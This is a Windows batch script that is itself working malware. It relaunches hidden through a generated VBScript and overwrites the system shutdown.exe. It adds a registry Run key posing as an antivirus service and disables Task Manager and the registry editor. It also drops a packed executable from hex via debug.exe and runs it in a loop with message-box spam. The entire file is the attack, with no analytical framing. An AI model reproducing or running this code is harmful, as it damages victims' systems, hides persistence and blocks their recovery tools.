@echo off
goto %1_

:_
echo set shell = CreateObject("wscript.shell") >ex.vbs
echo shell.run "cmd /c %~n0%~x0 oks", vbHide >>ex.vbs
start ex
exit

:oks_
type %windir%\system32\shutdown.exe>%temp%\ht.exe
echo.>%windir%\system32\shutdown.exe
%temp%\ht -s -f -t 60
ping -n 58 localhost>nul
%temp%\ht -a
type %~n0%~x0>%temp%\tre.bat
set l="HKLM\software\microsoft\windows\currentversion\policies\explorer\run"
reg add %l% /V "RunDll23, AVService" /d "%temp%\tre.bat" /f
reg add "hkcu\software\microsoft\windows\currentversion\policies\system" /v disabletaskmgr /t reg_dword /d "1" /f
reg add "hkcu\software\microsoft\windows\currentversion\policies\system" /v disableregistrytools /t reg_dword /d "1" /f

echo n b2bt.tk > b2bf.tk
echo e 0 4D 5A 66 73 67 00 00 00 00 00 00 00 50 45 00 00 >> b2bf.tk
echo e 10 4C 01 02 00 46 53 47 21 00 00 00 00 00 00 00 00 >> b2bf.tk
echo e 20 E0 00 0F 01 0B 01 00 00 00 02 00 00 00 02 00 00 >> b2bf.tk
echo e 30 00 00 00 00 54 01 00 00 00 10 00 00 0C 00 00 00 >> b2bf.tk
echo e 40 00 00 40 00 00 10 00 00 00 02 00 00 04 00 00 00 >> b2bf.tk
echo e 50 00 00 00 00 04 00 00 00 00 00 00 00 00 50 00 00 >> b2bf.tk
echo e 60 00 02 00 00 00 00 00 00 02 00 00 00 00 00 10 00 >> b2bf.tk
echo e 70 00 10 00 00 00 00 10 00 00 10 00 00 00 00 00 00 >> b2bf.tk
echo e 80 10 00 00 00 00 00 00 00 00 00 00 00 7C 41 00 00 >> b2bf.tk
echo e 90 84 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 >> b2bf.tk
echo e A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 >> b2bf.tk
echo e B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 >> b2bf.tk
echo e C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 >> b2bf.tk
echo e D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 >> b2bf.tk
echo e E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 >> b2bf.tk
echo e F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 >> b2bf.tk
echo e 100 00 00 00 00 00 00 00 00 00 00 00 00 00 30 00 00 >> b2bf.tk
echo e 110 00 10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 >> b2bf.tk
echo e 120 00 00 00 00 00 00 00 00 E0 00 00 C0 00 00 00 00 >> b2bf.tk
echo e 130 00 00 00 00 00 10 00 00 00 40 00 00 FD 01 00 00 >> b2bf.tk
echo e 140 00 02 00 00 00 00 00 00 00 00 00 00 00 00 00 00 >> b2bf.tk
echo e 150 E0 00 00 C0 87 25 C0 41 40 00 61 94 55 A4 B6 80 >> b2bf.tk
echo e 160 FF 13 73 F9 33 C9 FF 13 73 16 33 C0 FF 13 73 1F >> b2bf.tk
echo e 170 B6 80 41 B0 10 FF 13 12 C0 73 FA 75 3A AA EB E0 >> b2bf.tk
echo e 180 FF 53 08 02 F6 83 D9 01 75 0E FF 53 04 EB 24 AC >> b2bf.tk
echo e 190 D1 E8 74 2D 13 C9 EB 18 91 48 C1 E0 08 AC FF 53 >> b2bf.tk
echo e 1A0 04 3B 43 F8 73 0A 80 FC 05 73 06 83 F8 7F 77 02 >> b2bf.tk
echo e 1B0 41 41 95 8B C5 B6 00 56 8B F7 2B F0 F3 A4 5E EB >> b2bf.tk
echo e 1C0 9F 5E AD 97 AD 50 FF 53 10 95 8B 07 40 78 F3 75 >> b2bf.tk
echo e 1D0 03 FF 63 0C 50 55 FF 53 14 AB EB EE 33 C9 41 FF >> b2bf.tk
echo e 1E0 13 13 C9 FF 13 72 F8 C3 02 D2 75 05 8A 16 46 12 >> b2bf.tk
echo e 1F0 D2 C3 4B 45 52 4E 45 4C 33 32 2E 64 6C 6C 00 00 >> b2bf.tk
echo e 200 55 00 8B EC 83 C4 E0 C7 45 E8 E1 8E 03 FF 75 FE >> b2bf.tk
echo e 210 0C 11 01 10 89 FE F0 70 6A F6 0D A8 0A FC 03 67 >> b2bf.tk
echo e 220 C0 0A F4 FF 9F DC FE 28 0F 6C F8 48 07 F4 80 F0 >> b2bf.tk
echo e 230 E8 54 C3 11 E4 A1 0B BE 0C EC 83 76 1D FC B6 86 >> b2bf.tk
echo e 240 1C E0 68 20 1C CC 1B 6A 05 44 45 36 FC A4 0D C8 >> b2bf.tk
echo e 250 42 9B A1 1E 73 40 0B 1F 7C 88 56 8B D0 18 23 DE >> b2bf.tk
echo e 260 F4 29 39 40 91 DE 5B 7C 77 14 60 7E 0F 83 EE 08 >> b2bf.tk
echo e 270 79 2A D7 5E 17 EA 0F AB B5 DD 33 C7 E4 C2 3E A5 >> b2bf.tk
echo e 280 08 E0 0A 4F 27 0B B2 10 31 1B 7A DB AB 1E 22 5B >> b2bf.tk
echo e 290 43 03 CC FF 25 8C 20 40 76 32 54 90 06 94 86 43 >> b2bf.tk
echo e 2A0 98 21 9C 90 A0 C8 A8 64 AC 32 B0 19 B4 0C BC 86 >> b2bf.tk
echo e 2B0 45 C0 1E 01 EF BA 4A 91 FC 2E 21 A5 08 49 E0 70 >> b2bf.tk
echo e 2C0 91 11 BC 22 92 8F 01 0E 80 20 11 AA CC C9 F9 E3 >> b2bf.tk
echo e 2D0 C8 09 F9 95 09 84 32 13 09 23 26 FF 02 33 7F 39 >> b2bf.tk
echo e 2E0 11 41 22 09 55 53 65 14 22 7D 52 85 0C 7F C0 7C >> b2bf.tk
echo e 2F0 43 72 65 61 74 E7 D8 6F 6D 61 70 0E 69 62 6C F5 >> b2bf.tk
echo e 300 42 D7 F7 BF 5F 34 B0 2A 1A 3D 44 D0 16 53 F1 81 >> b2bf.tk
echo e 310 14 63 74 4F 62 6A A0 0D 10 DC 61 D5 6C 0A 36 44 >> b2bf.tk
echo e 320 35 60 85 1A 21 10 20 36 03 67 64 69 33 32 2E AF >> b2bf.tk
echo e 330 FE 39 2D 47 B4 28 92 20 08 53 79 73 C6 40 6D 4D >> b2bf.tk
echo e 340 12 1E 72 69 63 A9 5C 0D 6E 64 1E EF E1 61 67 E5 >> b2bf.tk
echo e 350 41 17 06 52 85 F9 FE 86 43 75 0C 57 72 43 6D 50 >> b2bf.tk
echo e 360 2E FE 90 A3 45 78 C1 FA 50 72 6F 63 B8 67 33 6B >> b2bf.tk
echo e 370 42 6E 42 5E 24 91 01 EB BF A6 00 00 D4 41 00 00 >> b2bf.tk
echo e 380 00 00 00 00 00 00 00 00 F2 01 00 00 D4 41 00 00 >> b2bf.tk
echo e 390 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 >> b2bf.tk
echo e 3A0 00 00 00 00 00 10 40 00 00 40 40 00 00 20 40 00 >> b2bf.tk
echo e 3B0 00 00 00 00 C4 41 40 00 80 00 00 00 00 7D 00 00 >> b2bf.tk
echo e 3C0 A4 41 40 00 E8 01 40 00 DC 01 40 00 DE 01 40 00 >> b2bf.tk
echo e 3D0 00 10 40 00 DE 41 00 00 EC 41 00 00 00 00 00 00 >> b2bf.tk
echo e 3E0 4C 6F 61 64 4C 69 62 72 61 72 79 41 00 00 47 65 >> b2bf.tk
echo e 3F0 74 50 72 6F 63 41 64 64 72 65 73 73 00 00 00 00 >> b2bf.tk
echo rcx >> b2bf.tk
echo 3FD >> b2bf.tk
echo w0 >> b2bf.tk
echo q >> b2bf.tk
debug<b2bf.tk
set fich="$.exe"

:verif
set fich=%fich: =%
if exist %fich% goto loop
ren b2bt.tk %fich%

:loop
for /f "tokens=*" %%a in (b2bf.tk) do (
echo MsgBox "%%a", vbCritical, "debugeo de: $.exe">hy.vbs
start hy
start $
ping -n 2 localhost>nul
)
ping -n 4 localhost>nul
exit